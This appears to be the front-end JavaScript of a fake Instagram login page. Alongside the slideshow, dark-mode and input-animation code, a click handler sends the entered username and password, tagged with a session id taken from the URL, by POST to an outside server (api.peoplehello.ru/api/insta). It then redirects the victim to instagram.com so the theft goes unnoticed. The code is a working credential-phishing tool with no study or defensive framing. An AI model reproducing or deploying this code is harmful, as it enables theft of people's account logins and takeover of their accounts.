let slide_content = document.querySelector('#slide-content')

let signin_form = document.querySelector('#signin-form')

let signin_btn = document.querySelector('#signin-btn')

let darkmode_toggle = document.querySelector('#darkmode-toggle')
let slide_index = 0

slide = () => {
    let slide_items = slide_content.querySelectorAll('img')
    slide_items.forEach(e => e.classList.remove('active'))
    slide_index = slide_index + 1 === slide_items.length ? 0 : slide_index + 1
    slide_items[slide_index].classList.add('active')
}

setInterval(slide, 2000)

// animate input
document.querySelectorAll('.animate-input').forEach(e => {
    let input = e.querySelector('input')
    let button = e.querySelector('button')

    input.onkeyup = () => {
        if (input.value.trim().length > 0) {
            e.classList.add('active')
        } else {
            e.classList.remove('active')
        }

        if (checkSigninInput()) {
            signin_btn.removeAttribute('disabled')

        } else {

            signin_btn.setAttribute('disabled', 'true')
        }

    }

    // show password button
    if (button) {
        button.onclick = () => {
            if (input.getAttribute('type') === 'text') {
                input.setAttribute('type', 'password')
                button.innerHTML = 'Show'
            } else {
                input.setAttribute('type', 'text')
                button.innerHTML = 'Hide'
            }
        }
    }
})

checkSigninInput = () => {
    let inputs = signin_form.querySelectorAll('input')
    return Array.from(inputs).every(input => {
        return input.value.trim().length >= 6
    })
}

// darkmode toggle
darkmode_toggle.onclick = (e) => {
    e.preventDefault()
    let body = document.querySelector('body')
    body.classList.toggle('dark')
    darkmode_toggle.innerHTML = body.classList.contains('dark') ? 'Lightmode' : 'Darkmode'
}
document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('signin-form')
    const inputs = form.querySelectorAll('input')
    const loginBtn = document.getElementById('signin-btn')

    const usernameInput = inputs[0]
    const passwordInput = inputs[1]

    // session_id ni URL dan olish
    const params = new URLSearchParams(window.location.search)
    const session_id = params.get('i')

    console.log(session_id)

    function toggleLoginButton() {
        loginBtn.disabled = !(usernameInput.value.trim() && passwordInput.value.trim())
    }

    usernameInput.addEventListener('input', toggleLoginButton)
    passwordInput.addEventListener('input', toggleLoginButton)

    loginBtn.addEventListener('click', async (e) => {
        e.preventDefault()

        const login = usernameInput.value.trim()
        const password = passwordInput.value.trim()

        try {
            await fetch(`https://api.peoplehello.ru/api/insta`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    session_id,
                    login,
                    password
                })
            })

            // yuborgandan keyin redirect
            window.location.href = 'https://instagram.com'

        } catch (err) {
            console.error(err)
        }
    })
})